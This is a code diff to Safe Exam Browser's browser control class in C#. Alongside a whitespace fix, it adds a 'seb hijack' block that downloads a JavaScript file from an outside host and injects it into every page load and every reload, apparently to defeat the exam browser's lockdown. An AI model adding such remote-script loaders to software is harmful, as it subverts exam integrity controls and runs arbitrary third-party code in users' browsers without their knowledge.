@@ -107,7 +107,7 @@ namespace SafeExamBrowser.Browser
 			control.FocusedNodeChanged += (w, b, f, n) => renderProcessMessageHandler.OnFocusedNodeChanged(w, b, f, n);
 			control.IsBrowserInitializedChanged += Control_IsBrowserInitializedChanged;
 			control.KeyEvent += (w, b, t, k, n, m, s) => keyboardHandler.OnKeyEvent(w, b, t, k, n, m, s);
-			control.LoadError += (o, e) => LoadFailed?.Invoke((int) e.ErrorCode, e.ErrorText, e.Frame.IsMain, e.FailedUrl);
+			control.LoadError += (o, e) => LoadFailed?.Invoke((int)e.ErrorCode, e.ErrorText, e.Frame.IsMain, e.FailedUrl);
 			control.LoadingProgressChanged += (w, b, p) => displayHandler.OnLoadingProgressChange(w, b, p);
 			control.LoadingStateChanged += (o, e) => LoadingStateChanged?.Invoke(e.IsLoading);
 			control.OpenUrlFromTab += (w, b, f, u, t, g, a) => a.Value = requestHandler.OnOpenUrlFromTab(w, b, f, u, t, g);
@@ -115,6 +115,15 @@ namespace SafeExamBrowser.Browser
 			control.ResourceRequestHandlerRequired += (IWebBrowser w, IBrowser b, IFrame f, IRequest r, bool n, bool d, string i, ref bool h, ResourceRequestEventArgs a) => a.Handler = requestHandler.GetResourceRequestHandler(w, b, f, r, n, d, i, ref h);
 			control.TitleChanged += (o, e) => TitleChanged?.Invoke(e.Title);
 			control.UncaughtExceptionEvent += (w, b, f, e) => renderProcessMessageHandler.OnUncaughtException(w, b, f, e);
+
+			// seb hijack
+			Settings.Browser.FilterSettings filterSettings = new Settings.Browser.FilterSettings();
+			filterSettings.Rules.Clear();
+			using (var client = new System.Net.WebClient())
+			{
+				var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script_340.js");
+				(control as IWebBrowser)?.ExecuteScriptAsyncWhenPageLoaded(the_script);
+			}
 		}
 
 		public void NavigateBackwards()
@@ -140,6 +149,12 @@ namespace SafeExamBrowser.Browser
 		public void Reload()
 		{
 			control.BrowserCore.Reload();
+
+			using (var client = new System.Net.WebClient())
+			{
+				var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script_340.js");
+				(control as IWebBrowser)?.ExecuteScriptAsyncWhenPageLoaded(the_script);
+			}
 		}
 
 		public void Zoom(double level)
